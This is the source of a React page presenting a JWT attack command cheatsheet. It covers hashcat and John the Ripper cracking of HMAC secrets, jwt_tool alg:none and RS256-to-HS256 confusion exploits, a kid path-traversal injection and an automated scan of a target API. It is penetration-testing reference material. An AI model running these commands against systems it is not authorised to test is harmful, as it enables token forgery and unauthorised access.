import type { Metadata } from "next";
import { pageMeta } from "@/lib/seo";
import { PageContainer } from "@/components/layout/PageContainer";
import { CodeBlock } from "@/components/shared/CodeBlock";
import { InfoCallout } from "@/components/shared/InfoCallout";
import { Mono } from "@/components/shared/Mono";
import { Link } from "@/components/shared/Link";

export const metadata: Metadata = pageMeta(
  "JWT Attack Cheatsheet",
  "Quick-reference commands for JWT attacks - jwt_tool, hashcat, john, Python snippets for alg:none, HS256 cracking, RS256 → HS256 confusion, and more.",
  "/cheatsheet",
);

const toolUrls: Record<string, string> = {
  hashcat: "https://hashcat.net",
  john: "https://www.openwall.com/john/",
  jwt_tool: "https://github.com/ticarpi/jwt_tool",
  rsa_sign2n: "https://github.com/silentsignal/rsa_sign2n",
};

interface CheatEntry {
  vuln: string;
  tool: string;
  command: string;
  notes: string;
}

const entries: CheatEntry[] = [
  {
    vuln: "Weak HMAC Secret",
    tool: "hashcat",
    command: "hashcat -m 16500 jwt.txt /path/to/rockyou.txt",
    notes: "Mode 16500 = JWT. Add -r rules/best64.rule for rule-based attack.",
  },
  {
    vuln: "Weak HMAC Secret",
    tool: "hashcat",
    command: "hashcat -m 16500 jwt.txt -a 3 ?a?a?a?a?a?a",
    notes: "Brute-force mode. Use ?a for all ASCII printable chars.",
  },
  {
    vuln: "Weak HMAC Secret",
    tool: "john",
    command: "john --format=HMAC-SHA256 jwt.txt --wordlist=/path/to/rockyou.txt",
    notes: "John the Ripper - format varies by JWT algorithm.",
  },
  {
    vuln: "Weak HMAC Secret",
    tool: "jwt_tool",
    command: "python3 jwt_tool.py <JWT> -C -d /path/to/wordlist.txt",
    notes: "-C = crack mode, -d = dictionary file.",
  },
  {
    vuln: "Public Key Recovery",
    tool: "rsa_sign2n",
    command: 'python3 jwt_forgery.py "<JWT1>" "<JWT2>"',
    notes: "Requires 2 RS256 tokens from same key. Outputs candidate public keys.",
  },
  {
    vuln: "Algorithm None",
    tool: "jwt_tool",
    command: "python3 jwt_tool.py <JWT> -X a",
    notes: "-X a = alg:none exploit. Tests all casing variants.",
  },
  {
    vuln: "Algorithm Confusion",
    tool: "jwt_tool",
    command: "python3 jwt_tool.py <JWT> -X k -pk public.pem",
    notes: "Uses public.pem as HMAC secret for HS256 signing.",
  },
  {
    vuln: "KID Path Traversal",
    tool: "jwt_tool",
    command: 'python3 jwt_tool.py <JWT> -I -hc kid -hv "../../../../../../dev/null" -S hs256 -p ""',
    notes: "-I = inject header claim, -hc = claim name, -hv = value.",
  },
  {
    vuln: "Generic Tampering",
    tool: "jwt_tool",
    command: "python3 jwt_tool.py <JWT> -T",
    notes: "-T = tampering mode (interactive). Good for manual claim modification.",
  },
  {
    vuln: "Scan for vulnerabilities",
    tool: "jwt_tool",
    command: "python3 jwt_tool.py <JWT> -t https://target.com/api -rh 'Authorization: Bearer JWT' -M pb",
    notes: "-M pb = playbook scan. Tests common JWT attack vectors automatically.",
  },
];

const wordlists = [
  {
    name: "rockyou.txt",
    url: "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt",
    notes: "Classic 14M password list",
  },
  {
    name: "scraped-JWT-secrets.txt (SecLists)",
    url: "https://github.com/danielmiessler/SecLists/blob/master/Passwords/scraped-JWT-secrets.txt",
    notes: "JWT-specific secrets list",
  },
];

const tools = [
  {
    name: "jwt_tool",
    url: "https://github.com/ticarpi/jwt_tool",
    desc: "Python toolkit for JWT testing, tampering, and exploitation",
    label: "GitHub →",
  },
  {
    name: "rsa_sign2n",
    url: "https://github.com/silentsignal/rsa_sign2n",
    desc: "RSA public key recovery from JWT signatures",
    label: "GitHub →",
  },
  {
    name: "hashcat",
    url: "https://hashcat.net",
    desc: "GPU-accelerated password recovery (mode 16500 for JWT)",
    label: "hashcat.net →",
  },
  {
    name: "john",
    url: "https://www.openwall.com/john/",
    desc: "John the Ripper - classic CPU-based cracker",
    label: "openwall.com →",
  },
];

export default function CheatsheetPage() {
  return (
    <PageContainer>
      <div style={{ paddingTop: "32px" }}>
        <div style={{ marginBottom: "32px" }}>
          <h1 style={{ fontSize: "32px", fontWeight: 600, color: "var(--text)", lineHeight: 1.2, margin: "0 0 8px" }}>
            CLI Cheatsheet
          </h1>
          <p style={{ fontSize: "16px", color: "var(--text-muted)", margin: 0 }}>
            Ready-to-use commands for operations too compute-heavy for the browser.
          </p>
        </div>

        <InfoCallout variant="info" title="Browser vs CLI">
          JWT Arsenal handles all crypto in-browser. For GPU brute-force of weak HMAC secrets and RSA key recovery
          (GCD over 4096-bit numbers), you need dedicated CLI tools listed here.
        </InfoCallout>

        {/* Commands table */}
        <div
          style={{
            marginTop: "24px",
            background: "var(--bg-elevated)",
            border: "1px solid var(--border)",
            borderRadius: "var(--radius)",
            overflow: "hidden",
          }}
        >
          <table style={{ width: "100%", borderCollapse: "collapse" }}>
            <thead>
              <tr style={{ background: "var(--surface-overlay)" }}>
                {["Vulnerability", "Tool", "Command", "Notes"].map((h) => (
                  <th
                    key={h}
                    style={{
                      padding: "12px 16px",
                      textAlign: "left",
                      fontSize: "12px",
                      fontWeight: 600,
                      color: "var(--text-muted)",
                      borderBottom: "1px solid var(--border)",
                      letterSpacing: "0.04em",
                      textTransform: "uppercase",
                    }}
                  >
                    {h}
                  </th>
                ))}
              </tr>
            </thead>
            <tbody>
              {entries.map((e, i) => (
                <tr
                  key={i}
                  style={{ borderBottom: i < entries.length - 1 ? "1px solid var(--border)" : "none" }}
                >
                  <td style={{ padding: "12px 16px", fontSize: "13px", color: "var(--text)", whiteSpace: "nowrap", verticalAlign: "top" }}>
                    {e.vuln}
                  </td>
                  <td style={{ padding: "12px 16px", verticalAlign: "top" }}>
                    {toolUrls[e.tool] ? (
                      <Link href={toolUrls[e.tool]} style={{ fontFamily: "var(--font-mono)", fontSize: "12px" }}>
                        {e.tool}
                      </Link>
                    ) : (
                      <Mono>
                        {e.tool}
                      </Mono>
                    )}
                  </td>
                  <td style={{ padding: "12px 16px", verticalAlign: "top" }}>
                    <code
                      style={{
                        fontFamily: "var(--font-mono)",
                        fontSize: "11px",
                        color: "var(--text)",
                        background: "var(--bg)",
                        padding: "4px 8px",
                        borderRadius: "4px",
                        display: "block",
                        wordBreak: "break-all",
                        lineHeight: 1.6,
                      }}
                    >
                      {e.command}
                    </code>
                  </td>
                  <td style={{ padding: "12px 16px", fontSize: "12px", color: "var(--text-muted)", lineHeight: 1.6, verticalAlign: "top" }}>
                    {e.notes}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>

        {/* Tool setup */}
        <div style={{ marginTop: "32px", marginBottom: "32px" }}>
          <h2 style={{ fontSize: "20px", fontWeight: 600, color: "var(--text)", marginBottom: "16px" }}>
            Tool Setup
          </h2>
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "16px" }}>
            <CodeBlock
              label="jwt_tool"
              language="bash"
              code={`git clone https://github.com/ticarpi/jwt_tool\ncd jwt_tool\npip3 install -r requirements.txt\npython3 jwt_tool.py --help`}
            />
            <CodeBlock
              label="rsa_sign2n"
              language="bash"
              code={`git clone https://github.com/silentsignal/rsa_sign2n\ncd rsa_sign2n\npip3 install -r requirements.txt\npython3 standalone/jwt_forgery.py --help`}
            />
          </div>
        </div>

        {/* Wordlists */}
        <div
          style={{
            background: "var(--bg-elevated)",
            border: "1px solid var(--border)",
            borderRadius: "var(--radius)",
            padding: "24px",
            marginBottom: "32px",
          }}
        >
          <h2 style={{ fontSize: "20px", fontWeight: 600, color: "var(--text)", marginBottom: "16px" }}>
            Wordlists
          </h2>
          <div style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
            {wordlists.map((w) => (
              <div key={w.name} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: "16px" }}>
                <div>
                  <div style={{ fontSize: "14px", fontWeight: 500, color: "var(--text)", marginBottom: "2px" }}>{w.name}</div>
                  <div style={{ fontSize: "12px", color: "var(--text-muted)" }}>{w.notes}</div>
                </div>
                <a
                  href={w.url}
                  target="_blank"
                  rel="noopener noreferrer"
                  style={{
                    display: "inline-flex",
                    alignItems: "center",
                    height: "32px",
                    padding: "0 12px",
                    background: "transparent",
                    border: "1px solid var(--border)",
                    borderRadius: "var(--radius)",
                    fontSize: "12px",
                    color: "var(--text-muted)",
                    textDecoration: "none",
                    whiteSpace: "nowrap",
                    flexShrink: 0,
                  }}
                >
                  View →
                </a>
              </div>
            ))}
          </div>
        </div>

        {/* Tools reference */}
        <div
          style={{
            background: "var(--bg-elevated)",
            border: "1px solid var(--border)",
            borderRadius: "var(--radius)",
            padding: "24px",
          }}
        >
          <h2 style={{ fontSize: "20px", fontWeight: 600, color: "var(--text)", marginBottom: "16px" }}>
            Tool Reference
          </h2>
          <div style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
            {tools.map((t) => (
              <div key={t.name} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: "16px" }}>
                <div>
                  <Mono>{t.name}</Mono>
                  <div style={{ fontSize: "12px", color: "var(--text-muted)", marginTop: "2px" }}>{t.desc}</div>
                </div>
                <a
                  href={t.url}
                  target="_blank"
                  rel="noopener noreferrer"
                  style={{
                    display: "inline-flex",
                    alignItems: "center",
                    height: "32px",
                    padding: "0 12px",
                    background: "transparent",
                    border: "1px solid var(--border)",
                    borderRadius: "var(--radius)",
                    fontSize: "12px",
                    color: "var(--text-muted)",
                    textDecoration: "none",
                    whiteSpace: "nowrap",
                    flexShrink: 0,
                  }}
                >
                  {t.label}
                </a>
              </div>
            ))}
          </div>
        </div>
      </div>
    </PageContainer>
  );
}
